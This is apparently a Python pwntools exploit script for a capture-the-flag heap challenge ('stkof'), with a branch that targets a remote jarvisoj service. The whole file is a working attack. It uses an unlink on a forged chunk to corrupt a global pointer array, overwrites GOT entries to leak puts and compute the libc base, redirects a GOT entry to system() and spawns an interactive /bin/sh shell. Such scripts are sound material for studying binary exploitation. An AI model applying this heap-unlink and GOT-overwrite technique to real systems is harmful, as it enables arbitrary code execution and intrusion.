
from pwn import *

DEBUG = True
if DEBUG:
	io = process("./stkof")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./stkof")
else:
	io = remote("pwn.jarvisoj.com","9879")
	libc = ELF("./libc.so.6")
	elf = ELF("./guestbook2")


def Add(size):
	io.sendline("1")
	io.sendline(str(size))
	io.recvuntil("OK\n")
	
def Edit(index,size,content):
	io.sendline("2")
	io.sendline(str(index))
	io.sendline(str(size))
	io.send(content)
	io.recvuntil("OK\n")

def delete(index):
	io.sendline("3")
	io.sendline(str(index))
	#io.recvuntil("OK\n")

bss_addr = 0x0000000000602140
context.log_level = "debug"
gdb.attach(io,"b *0x0000000000400C8A")
Add(0x200)
Edit(1,0x200,"a"*0x200)
#Delete(0)
Add(0x40)
Add(0x80)
payload = p64(0) + p64(0x40) + p64(bss_addr+0x10-0x18) + p64(bss_addr+0x10-0x10)
print "a".ljust(4,"b")
payload = payload.ljust(0x40,"a")
payload += p64(0x40) + p64(0x90)
Edit(2,len(payload),payload)
delete(3)
free_got = elf.got["free"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
atol_got = elf.got["atol"]
payload = 8*"A" + p64(free_got) + p64(puts_got) + p64(atol_got)
Edit(2,len(payload),payload)
payload = p64(puts_plt)
Edit(0,len(payload),payload)
delete(1)
info = io.recvline()
info = io.recvline()
print info
puts_addr = u64(info[:6] + "\x00\x00")
log.success("puts_addr:" + hex(puts_addr))
libc.address = puts_addr - libc.symbols["puts"]
system_addr = libc.symbols["system"]
log.success("system_addr" + hex(system_addr))
#binsh = libc.search("/bin/sh").next()
payload = p64(system_addr)
Edit(2,len(payload),payload)
io.sendline("2")
io.sendline("/bin/sh")
io.interactive()
